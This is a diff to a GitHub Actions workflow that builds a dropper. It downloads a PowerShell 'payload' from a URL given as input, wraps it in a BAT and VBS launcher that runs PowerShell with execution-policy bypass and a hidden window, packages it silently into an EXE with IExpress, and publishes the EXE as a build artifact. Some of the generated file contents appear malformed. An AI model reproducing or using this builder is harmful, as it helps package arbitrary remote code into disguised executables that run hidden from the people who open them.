@@ -1,4 +1,4 @@
-name: Convert Batch to EXE
+name: Convert VBS to EXE (Fully Embedded)
 
 on:
   workflow_dispatch:
@@ -17,35 +17,45 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    # Step 2: Fetch the PowerShell Payload
+    # Step 2: Fetch PowerShell Payload
     - name: Fetch PowerShell Payload
       shell: powershell
       run: |
         Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.ps1'
         if (!(Test-Path "payload.ps1")) { Write-Host "Payload script missing!"; exit 1 }
 
-    # Step 3: Create Embedded Batch File
-    - name: Create Batch Wrapper
-      shell: powershell
-      run: |
-        Set-Content -Path "payload.bat" -Value @"
-        @echo off
-        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0payload.ps1"
-        exit
-        "@
-
-    # Step 4: Convert Batch to EXE (Using Bat To Exe Converter)
-    - name: Convert Batch to EXE
+    # Step 3: Create Embedded BAT Wrapper
+    - name: Create BAT File
       shell: cmd
       run: |
-        powershell Invoke-WebRequest -Uri "https://f2ko.de/downloads/Bat_To_Exe_Converter.zip" -OutFile "b2e.zip"
-        powershell Expand-Archive -Path "b2e.zip" -DestinationPath "b2e"
-        b2e\Bat_To_Exe_Converter.exe /compile "payload.bat" /saveas "payload.exe" /invisible /embed
+        echo @echo off > payload.bat
+        echo echo Creating VBS File... >> payload.bat
+        echo echo Set objShell = CreateObject("WScript.Shell") > payload.vbs >> payload.bat
+        echo echo objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File %~dp0payload.ps1", 0, False >> payload.bat
+        echo wscript.exe payload.vbs >> payload.bat
+
+    # Step 4: Convert BAT to EXE using IExpress
+    - name: Create EXE with IExpress
+      shell: cmd
+      run: |
+        echo [Version] > package.sed
+        echo Class=IEXPRESS >> package.sed
+        echo [Options] >> package.sed
+        echo UseLongFileName=1 >> package.sed
+        echo [Strings] >> package.sed
+        echo InstallCommand=payload.bat >> package.sed
+        echo FILE0=payload.bat >> package.sed
+        echo [SourceFiles] >> package.sed
+        echo SourceFiles0=. >> package.sed
+        echo [Files] >> package.sed
+        echo %FILE0% >> package.sed
+        iexpress /N /Q package.sed
 
     # Step 5: Upload the EXE
-    - name: Upload Executable
+    - name: Upload EXE
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
-        path: payload.exe
+        path: package.exe
+
 
